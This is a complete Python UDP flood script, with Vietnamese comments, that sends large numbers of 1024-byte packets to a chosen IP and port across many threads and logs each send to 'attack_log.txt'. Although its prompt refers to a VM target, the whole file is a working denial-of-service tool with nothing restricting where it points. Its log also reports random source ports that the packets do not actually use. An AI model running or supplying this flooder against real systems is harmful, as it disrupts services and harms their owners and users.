import socket
import threading
import random
import time
import sys

try:
    from tqdm import tqdm
    USE_TQDM = True
except ImportError:
    USE_TQDM = False

# === Config ===
message = b"X" * 1024
log_file = "attack_log.txt"
lock = threading.Lock()
sent_count = 0
log_buffer = []

# === Hàm gửi packet ===
def flood(thread_id, packets_per_thread, target_ip, target_port):
    global sent_count

    for i in range(1, packets_per_thread + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            source_port = random.randint(1024, 65535)
            sock.sendto(message, (target_ip, target_port))
            sock.close()

            with lock:
                sent_count += 1
                percent = (sent_count / total_packets) * 100
                log_line = f"[Thread {thread_id}] Sent {sent_count}/{total_packets} ({percent:.2f}%) to {target_ip}:{target_port} from port {source_port}"
                if USE_TQDM:
                    progress_bar.set_description(log_line)
                    progress_bar.update(1)
                else:
                    print(log_line)
                log_buffer.append(log_line + "\n")

        except Exception as e:
            with lock:
                print(f"[Thread {thread_id}] Error: {e}")

# === Kiểm tra đầu vào ===
def get_int_input(prompt, min_val, max_val):
    while True:
        try:
            val = int(input(prompt))
            if min_val <= val <= max_val:
                return val
            else:
                print(f"⚠️ Please enter a number between {min_val} and {max_val}")
        except ValueError:
            print("❌ Invalid number. Try again.")

# === Hàm chính ===
if __name__ == "__main__":
    target_ip = input("Enter VM machine's IP: ").strip()
    target_port = get_int_input("Enter destination port (e.g. 80): ", 1, 65535)
    total_packets = get_int_input("Enter number of packets (e.g. 65000): ", 1, 10**6)
    num_threads = get_int_input("Enter number of threads (e.g. 10): ", 1, 1000)

    packets_per_thread = total_packets // num_threads
    threads = []

    print(f"\n🚀 Starting flood of {total_packets} packets to {target_ip}:{target_port} using {num_threads} threads...\n")
    start_time = time.time()

    if USE_TQDM:
        progress_bar = tqdm(total=total_packets)

    for i in range(num_threads):
        t = threading.Thread(target=flood, args=(i + 1, packets_per_thread, target_ip, target_port))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    if USE_TQDM:
        progress_bar.close()

    elapsed = (time.time() - start_time) / 60

    # Ghi log một lần
    with open(log_file, "a") as f:
        f.writelines(log_buffer)

    print(f"\n✅ Finished sending {total_packets} packets in {elapsed:.2f} minutes.")
    print(f"📄 Log saved to: {log_file}")